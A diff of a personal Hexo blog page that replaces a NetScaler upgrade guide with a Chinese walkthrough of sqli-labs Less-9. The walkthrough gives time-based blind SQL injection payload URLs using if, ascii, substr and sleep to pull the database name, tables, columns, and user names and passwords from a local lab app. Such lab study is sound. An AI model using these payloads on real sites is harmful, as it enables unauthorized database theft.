@@ -4,12 +4,10 @@
 
 <head><meta name="generator" content="Hexo 3.9.0">
     <meta charset="utf-8">
-    <meta name="keywords" content="netscaler 升级, Junk Blog">
-    <meta name="description" content="环境netscaler版本： 11.1（具体版本忘了）
-平台型号：NSMPX-5550
-客户需求：把 netscaler 升级到最新的 13.0 版本。
-升级前准备：保证 PC 机能够 ssh 到 netscaler 上。
-注： netsc">
+    <meta name="keywords" content="sqli-labs-Less9, Junk Blog">
+    <meta name="description" content="前言这一关测试的是时间盲注，payload 语句结构和布尔盲注相似。
+基础知识IF(expr1,expr2,expr3)：如果 expr1 的值为 true，则返回 expr2 的值，如果 expr1 的值为 false
+sleep(n)：">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <meta name="renderer" content="webkit|ie-stand|ie-comp">
@@ -17,7 +15,7 @@
     <meta name="format-detection" content="telephone=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
-    <title>netscaler 升级 | Junk Blog</title>
+    <title>sqli-labs-Less9 | Junk Blog</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/font-awesome.min.css">
@@ -286,13 +284,13 @@
 
 
 
-<div class="bg-cover post-cover" style="background-image: url('https://i.loli.net/2019/10/15/KCTYrULxcDp8bwA.jpg')">
+<div class="bg-cover post-cover" style="background-image: url('https://i.loli.net/2019/10/16/NDibuKXPzyrAIGj.png')">
     <div class="container">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
                     <div class="description center-align post-title">
-                        netscaler 升级
+                        sqli-labs-Less9
                     </div>
                 </div>
             </div>
@@ -384,8 +382,12 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/Netscaler-ADC/" target="_blank">
-                                <span class="chip bg-color">Netscaler(ADC)</span>
+                            <a href="/tags/sqli-labs/" target="_blank">
+                                <span class="chip bg-color">sqli-labs</span>
+                            </a>
+                        
+                            <a href="/tags/SQL-Injection/" target="_blank">
+                                <span class="chip bg-color">SQL Injection</span>
                             </a>
                         
                     </div>
@@ -396,8 +398,8 @@
                     <div class="post-cate">
                         <i class="fa fa-bookmark fa-fw icon-category"></i>
                         
-                            <a href="/categories/Citrix/" class="post-category" target="_blank">
-                                Citrix
+                            <a href="/categories/Web-security/" class="post-category" target="_blank">
+                                Web security
                             </a>
                         
                     </div>
@@ -408,21 +410,21 @@
             <div class="post-info">
                 <div class="post-date info-break-policy">
                     <i class="fa fa-calendar-minus-o fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2019-10-14
+                    2019-10-19
                 </div>
 
                 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-file-word-o fa-fw"></i>文章字数:&nbsp;&nbsp;
-                        929
+                        520
                     </div>
                     
 
                     
                     <div class="info-break-policy">
                         <i class="fa fa-clock-o fa-fw"></i>阅读时长:&nbsp;&nbsp;
-                        3 分
+                        2 分
                     </div>
                     
                 
@@ -438,116 +440,45 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h1><p><strong>netscaler版本：</strong> 11.1（具体版本忘了）</p>
-<p><strong>平台型号</strong>：NSMPX-5550</p>
-<p><strong>客户需求</strong>：把 netscaler 升级到最新的 13.0 版本。</p>
-<p><strong>升级前准备</strong>：保证 PC 机能够 ssh 到 netscaler 上。</p>
-<p><strong>注：</strong> netscaler 默认是开启 ssh 的，一般连接不上，是因为 PC 机到 netscaler 网络之间有防火墙或策略，阻断了 ssh 的通信。如果出现 ssh 通信没问题，但是 PC 机还是连接不上 ssh 的情况，很有可能是 netscaler 因为一些问题，自动关闭了 ssh 服务。</p>
-<h1 id="单台升级步骤"><a href="#单台升级步骤" class="headerlink" title="单台升级步骤"></a>单台升级步骤</h1><ol>
-<li>备份配置文件</li>
+                <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>这一关测试的是时间盲注，payload 语句结构和布尔盲注相似。</p>
+<h1 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h1><p>IF(expr1,expr2,expr3)：如果 expr1 的值为 true，则返回 expr2 的值，如果 expr1 的值为 false</p>
+<p>sleep(n)：命令延时 n 秒后执行</p>
+<h1 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h1><ol>
+<li><p>用 if()+ascii()+substr() 函数来分析输出内容</p>
+</li>
+<li><p>用 sleep() 函数判断输出的内容是否正确。</p>
+</li>
 </ol>
-<p><img src="https://i.loli.net/2019/10/14/UnYlSHcChJk74wy.png" alt="ADC-1.png"></p>
+<h1 id="注入步骤"><a href="#注入步骤" class="headerlink" title="注入步骤"></a>注入步骤</h1><h2 id="基于时间的GET单引号盲注"><a href="#基于时间的GET单引号盲注" class="headerlink" title="基于时间的GET单引号盲注"></a>基于时间的GET单引号盲注</h2><ol>
+<li><strong>输入字符使网页报错,判断执行的 SQL 语句</strong></li>
+</ol>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1'</code></pre><p><img src="https://i.loli.net/2019/10/16/JcXFtHx2eAzWS45.png" alt="less9-1.png"></p>
+<p>注：网页是正常界面，使用时间盲注进行测试</p>
 <ol start="2">
-<li>查看 Citrix ADC 硬件平台型号</li>
+<li><strong>判断数据库字符串的长度</strong></li>
 </ol>
-<p><img src="https://i.loli.net/2019/10/14/1kPnRUpgZwWA8qa.png" alt="ADC-2.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))&gt;56, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/5pRUJo36x1wNarc.png" alt="less9-2.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(length(database()))=56, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/FZIXTMNaoPAYJj6.png" alt="less9-3.png"></p>
 <ol start="3">
-<li>根据 Citrix ADC 硬件平台的兼容性列表，下载 ADC 升级包</li>
+<li><strong>判断数据库</strong></li>
 </ol>
-<p><strong>Citrix ADC MPX硬件-软件兼容性列表：</strong> <a href="https://docs.citrix.com/en-us/citrix-hardware-platforms/mpx/mpx-hardware-software-compatibility-matrix.html" target="_blank" rel="noopener">https://docs.citrix.com/en-us/citrix-hardware-platforms/mpx/mpx-hardware-software-compatibility-matrix.html</a></p>
-<p><strong>netscaler 升级包（可根据平台型号修改链接）：</strong> <a href="https://www.citrix.com/downloads/citrix-adc/firmware/release-13-0-build-36-27.html" target="_blank" rel="noopener">https://www.citrix.com/downloads/citrix-adc/firmware/release-13-0-build-36-27.html</a></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))&gt;115, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/3GwjcbBpYnvPZH5.png" alt="less9-4.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr(database(),1,1))=115, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/eonK3brJVg4LaXY.png" alt="less9-5.png"></p>
 <ol start="4">
-<li>使用 xshell 连接到 ADC</li>
+<li><strong>判断表</strong></li>
 </ol>
-<pre class=" language-bash"><code class="language-bash">//** 进入 shell **//
-<span class="token operator">></span> shell
-
-//** 创建存放升级包目录 **//
-root@ns01<span class="token comment" spellcheck="true"># mkdir /var/nsinstall/13.0-36.27</span></code></pre>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))&gt;101, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/8jGMV7ZxhvKIFpz.png" alt="less9-6.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/9tTmR73w46gBbe2.png" alt="less9-7.png"></p>
 <ol start="5">
-<li>Xftp 连到ADC，将下载的升级包上传到安装目录下</li>
+<li><strong>判断字段</strong></li>
 </ol>
-<p><img src="https://i.loli.net/2019/10/14/LvMuaD1iB5WjmPY.png" alt="ADC-3.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select column_name from information_schema.columns where table_schema='security' AND TABLE_NAME='users' limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/4m5lzPZ81nhMNDB.png" alt="less9-8.png"></p>
 <ol start="6">
-<li>安装 netscaler 升级包</li>
+<li><strong>判断数据</strong></li>
 </ol>
-<pre class=" language-bash"><code class="language-bash">//** 进入安装目录 **//
-root@ns01<span class="token comment" spellcheck="true"># cd /var/nsinstall/13.0-36.27</span>
-
-//** 解压升级包 **//
-root@ns01<span class="token comment" spellcheck="true"># tar -xzf build-13.0-36.27_nc_64.tgz</span>
-
-//** 查看安装脚本 <span class="token punctuation">(</span>可选<span class="token punctuation">)</span> **//
-root@ns01<span class="token comment" spellcheck="true"># ls installns</span>
-installns
-
-//** 执行安装脚本 **//
-root@ns01<span class="token comment" spellcheck="true"># installns</span>
-输出结果省略……
-Installation has completed.     //安装成功
-
-Reboot NOW? <span class="token punctuation">[</span>Y/N<span class="token punctuation">]</span> y             //重启 ADC
-Rebooting <span class="token punctuation">..</span>.
-……</code></pre>
-<h1 id="netscaler-HA-升级步骤（没有操作过，具体步骤以-400-发的文档为例）"><a href="#netscaler-HA-升级步骤（没有操作过，具体步骤以-400-发的文档为例）" class="headerlink" title="netscaler HA 升级步骤（没有操作过，具体步骤以 400 发的文档为例）"></a>netscaler HA 升级步骤（没有操作过，具体步骤以 400 发的文档为例）</h1><ol>
-<li><p>下载好升级包</p>
-</li>
-<li><p>升级前执行一次配置保存操作，并做好备份。</p>
-</li>
-<li><p>HA 环境下，我们需要先升级备机，再升级主机。升级之前，需要在主机上配置 Stay Primary，在备机上配置 Stay Secondary，并取消同步。</p>
-</li>
-</ol>
-<pre class=" language-bash"><code class="language-bash">//** 通过 PUTTY 或其他工具 SSH 登录主机，并运行如下命令： **//
-<span class="token keyword">set</span> ha node -hasync DISABLED -haprop DISABLED -hastatus STAYPRIMARY
-save config</code></pre>
-<pre class=" language-bash"><code class="language-bash">//** 通过 PUTTY 或其他工具 SSH 登录备机，并运行如下命令: **//
-<span class="token keyword">set</span> ha node -hasync DISABLED -haprop DISABLED -hastatus STAYSECONDARY
-save config</code></pre>
-<ol start="4">
-<li>升级备机</li>
-</ol>
-<pre class=" language-bash"><code class="language-bash">//** 进入 shell **//
-shell
-
-//** 创建存放安装包目录 **//
-<span class="token function">mkdir</span> /var/nsinstall/11.1-56.19
-
-//** 利用 Winscp 工具将升级包上传到 /var/nsinstall/11.1-56.19 目录下 **//</code></pre>
-<pre class=" language-bash"><code class="language-bash">//** 返回命令行，继续运行如下命令 **//
-<span class="token function">cd</span> /var/nsinstall/11.1-56.19/
-
-//** 解压升级包 **//
-<span class="token function">tar</span> -xzf build-11.1-56.19_nc.tgz
-
-//** 执行安装脚本 **//
-installns</code></pre>
-<ol start="5">
-<li><p>当命令行提示升级完成，是否需要重启时，输入 Y；若升级过程出现任何异常，请联系思杰技术支持。</p>
-</li>
-<li><p>设备重启后，取消主备的 Stay Primary 以及 Stay Secondary 状态，以便进行 HA Failover 后升级另一台设备。</p>
-</li>
-</ol>
-<pre class=" language-bash"><code class="language-bash">//** SSH 到升级后的备机，在命令行中输入如下命令: **//
- <span class="token keyword">set</span> ha node -hasync DISABLED -haprop DISABLED -hastatus ENABLED</code></pre>
-<pre class=" language-bash"><code class="language-bash">//** SSH 到未升级的主机，在命令行中输入如下命令 **//
-<span class="token keyword">set</span> ha node -hasync DISABLED -haprop DISABLED -hastatus ENABLED
-force failover</code></pre>
-<ol start="7">
-<li><p>现在新的主机是升级后的那一台设备了。访问一下业务，检查业务是否一切正常。</p>
-</li>
-<li><p>确定业务正常后，升级新的备机，重复步骤3-5即可。</p>
-</li>
-<li><p>恢复HA同步配置</p>
-</li>
-</ol>
-<pre class=" language-bash"><code class="language-bash">//** 通过 PUTTY 或其他工具 SSH 登录主机，并运行如下命令：**//
-<span class="token keyword">set</span> ha node -hasync ENABLED -haprop ENABLED -hastatus ENABLED
-save config</code></pre>
-<pre class=" language-bash"><code class="language-bash">//** 通过 PUTTY 或其他工具 SSH 登录备机，并运行如下命令: **//
-<span class="token keyword">set</span> ha node -hasync ENABLED -haprop ENABLED -hastatus ENABLED
-save config</code></pre>
-<p>10.GUI 界面上查看下 HA 状态是否如下。若如下，则一切正常。</p>
-<p><img src="https://i.loli.net/2019/10/14/LoU5N4JT7Dc1npv.png" alt="ADC-HA.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select username FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/DVzIYSaxdcOqB7p.png" alt="less9-9.png"></p>
+<pre><code>http://192.168.150.128/sqli-labs-master/Less-9/?id=1' and if(ascii(substr((select password FROM security.users limit 0,1),1,1))=68, 0, sleep(5))%23</code></pre><p><img src="https://i.loli.net/2019/10/16/6bsNqC2iOByda4k.png" alt="less9-10.png"></p>
+<h1 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h1><p><a href="https://www.cnblogs.com/omnis/p/8318743.html" target="_blank" rel="noopener">【sqli-labs】 less9 GET - Blind - Time based. - Single Quotes (基于时间的GET单引号盲注)</a></p>
 <script>
         document.querySelectorAll('.github-emoji')
           .forEach(el => {
@@ -589,7 +520,7 @@ save config</code></pre>
                     </span>
                     <a href="https://github.com/hhkk2334/hhkk2334.github.io" class="b-link-green">Junk Blog</a>
                     <i class="fa fa-angle-right fa-lg fa-fw text-color"></i>
-                    <a href="/2019/10/14/netscaler-升级/" class="b-link-green">netscaler 升级</a>
+                    <a href="/2019/10/19/sqli-labs-Less9/" class="b-link-green">sqli-labs-Less9</a>
                 </p>
             </div>
         </div>
@@ -608,7 +539,7 @@ save config</code></pre>
 <script src="/libs/gitment/gitment.js"></script>
 <script>
 var gitment = new Gitment({
-    id: 'Mon Oct 14 2019 22:13:12 GMT+0800',
+    id: 'Sat Oct 19 2019 23:25:41 GMT+0800',
     owner: '315053891',
     repo: 'hhkk2334.github.io',
     oauth: {
@@ -636,28 +567,30 @@ gitment.render('gitment-content');
             <div class="article-badge left-badge text-color">
                 <i class="fa fa-chevron-left"></i>&nbsp;上一篇</div>
             <div class="card">
-                <a href="/2019/10/15/sqli-labs-Less9/">
+                <a href="/2019/10/20/5G科普/">
                     <div class="card-image">
                         
-                        <img src="https://i.loli.net/2019/10/16/NDibuKXPzyrAIGj.png" class="responsive-img" alt="sqli-labs-Less9">
+                        <img src="https://i.loli.net/2019/10/19/2nQU8jGsa3x6fYX.jpg" class="responsive-img" alt="5G科普">
                         
-                        <span class="card-title">sqli-labs-Less9</span>
+                        <span class="card-title">5G科普</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">前言这一关测试的是时间盲注，payload 语句结构和布尔盲注相似。
-基础知识IF(expr1,expr2,expr3)：如果 expr1 的值为 true，则返回 expr2 的值，如果 expr1 的值为 false
-sleep(n)：</div>
+                    <div class="summary">原作者：小枣君
+原出处：鲜枣课堂
+原链接：有史以来最强的5G入门科普！
+前言此文从通信技术的角度科普 5G 知识，解释了 5G 通信技术的优缺点。
+什么是 5G？5G 就是第五代通信技术，主要特点是波长为毫米级，超宽带，超高速度，超低延时。</div>
                     <div class="publish-info">
                         <span class="publish-date">
-                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-15
+                            <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-20
                         </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/Web-security/" class="post-category" target="_blank">
-                                    Web security
+                            <a href="/categories/科普/" class="post-category" target="_blank">
+                                    科普
                                 </a>
                             
                             
@@ -667,12 +600,12 @@ sleep(n)：</div>
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/sqli-labs/" target="_blank">
-                        <span class="chip bg-color">sqli-labs</span>
+                    <a href="/tags/通信/" target="_blank">
+                        <span class="chip bg-color">通信</span>
                     </a>
                     
-                    <a href="/tags/SQL-Injection/" target="_blank">
-                        <span class="chip bg-color">SQL Injection</span>
+                    <a href="/tags/5G/" target="_blank">
+                        <span class="chip bg-color">5G</span>
                     </a>
                     
                 </div>
@@ -686,31 +619,43 @@ sleep(n)：</div>
                 下一篇&nbsp;<i class="fa fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2019/10/13/我的博客/">
+                <a href="/2019/10/16/netscaler-升级/">
                     <div class="card-image">
                         
-                        <img src="https://i.loli.net/2019/10/13/NTc7MfD3gyJsadO.jpg" class="responsive-img" alt="我的博客">
+                        <img src="https://i.loli.net/2019/10/15/KCTYrULxcDp8bwA.jpg" class="responsive-img" alt="netscaler 升级">
                         
-                        <span class="card-title">我的博客</span>
+                        <span class="card-title">netscaler 升级</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
-                    <div class="summary">我为什么写博客？因为受朋友的影响，很早之前就在写笔记。写笔记的初衷是整合、巩固、记录自己学习的知识，如果有一天，我想回顾这些知识点，对照着曾经记录的笔记，会起到事半功倍的效果。但是时间长了，发现自己一直在偷懒，笔记写得囫囵吞枣，而且写着写着</div>
+                    <div class="summary">环境netscaler版本： 11.1（具体版本忘了）
+平台型号：NSMPX-5550
+客户需求：把 netscaler 升级到最新的 13.0 版本。
+升级前准备：保证 PC 机能够 ssh 到 netscaler 上。
+注： netsc</div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-13
+                                <i class="fa fa-clock-o fa-fw icon-date"></i>2019-10-16
                             </span>
                         <span class="publish-author">
                             
                             <i class="fa fa-bookmark fa-fw icon-category"></i>
                             
-                            <a href="/categories/杂谈/" class="post-category" target="_blank">
-                                    杂谈
+                            <a href="/categories/Citrix/" class="post-category" target="_blank">
+                                    Citrix
                                 </a>
                             
                             
                         </span>
                     </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Netscaler-ADC/" target="_blank">
+                        <span class="chip bg-color">Netscaler(ADC)</span>
+                    </a>
+                    
                 </div>
                 
             </div>
@@ -821,7 +766,7 @@ sleep(n)：</div>
             <br>
             
             &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
-                class="white-color">23.2k</span>&nbsp;字
+                class="white-color">23.7k</span>&nbsp;字
                
             
 			
